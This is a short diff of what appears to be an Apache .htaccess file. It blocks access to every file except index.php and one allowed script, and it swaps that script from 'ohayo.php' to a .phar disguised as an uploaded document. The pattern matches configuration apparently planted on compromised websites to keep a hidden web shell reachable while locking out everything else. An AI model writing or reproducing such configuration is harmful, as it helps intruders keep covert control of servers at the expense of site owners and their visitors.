@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(ohayo.php|index.php)$"># 
+<FilesMatch "^(20240129133818-4798-file_kartu_taspen-20240129-70-app.phar|index.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
